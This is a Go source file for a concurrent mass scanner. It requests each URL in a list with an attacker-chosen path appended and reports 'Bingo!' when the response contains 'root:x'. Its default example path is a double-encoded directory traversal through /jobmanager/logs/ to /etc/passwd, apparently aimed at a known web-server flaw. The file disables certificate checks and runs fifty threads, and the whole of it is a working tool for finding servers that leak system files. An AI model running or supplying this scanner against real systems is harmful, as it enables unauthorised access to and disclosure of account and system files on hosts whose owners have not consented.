package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path"
	"strings"
	"time"

	"github.com/cheggaaa/pb/v3"
	"github.com/zenthangplus/goccm"
)

var colorRed string = "\033[31m"
var colorReset string = "\033[0m"
var arg1 = flag.String("file", "/tmp/URLs.txt", "file with URL's")
var arg2 = flag.String("content", "root:x", "What to look for ?")
var arg3 = flag.Int("threads", 50, "number of concurrent threads")
var arg4 = flag.String("path", "", "adding a path, example /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd")
var conMan = goccm.New(*arg3)

func linesInFile(fileName string) []string {
	f, err := os.Open(fileName)
	if err != nil {
		fmt.Println("error Opening File: ", err)
		fmt.Println(colorRed, "Check -h for help !", colorReset)
	}
	defer f.Close()
	// Create new Scanner.
	scanner := bufio.NewScanner(f)
	result := []string{}
	// Use Scan.
	for scanner.Scan() {
		line := scanner.Text()
		// Append line to result.
		result = append(result, line)
	}
	return result
}

func getStuff(v, arg2 string, arg4 string) {
	defer conMan.Done()
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := http.Client{
		Timeout: 5 * time.Second,
	}
	// fmt.Println("processing: ", v)
	u, err := url.Parse(v)
	u.Path = path.Join(u.Path, arg4)
	value := u.String() // prints http://foo/bar.html
	//fmt.Println(value)
	//value := v + arg4
	resp, err := client.Get(strings.TrimSpace(value))
	if err != nil {
		defer func() {
			if err := recover(); err != nil {
				// fmt.Println("recovered from panic", err)
			}
		}()
	}
	htmlBody, err2 := ioutil.ReadAll(resp.Body)
	if err2 != nil {
		// fmt.Println("error ReadAll: ",err2)
	}
	resp.Body.Close()
	if strings.Contains(string(htmlBody), arg2) {
		fmt.Println(colorRed, "Bingo!: ", arg2, "Found in:", v, colorReset)
	}
}

func main() {

	flag.Parse()
	fmt.Println("Starting .....!")
	a := linesInFile(*arg1)
	bar := pb.StartNew(len(a))
	if len(a) > 0 {
		for _, v := range a {
			conMan.Wait()
			bar.Increment()
			go getStuff(v, *arg2, *arg4)
		}
		bar.Finish()
		conMan.WaitAllDone()
	}

	fmt.Println("Done .....!")

}
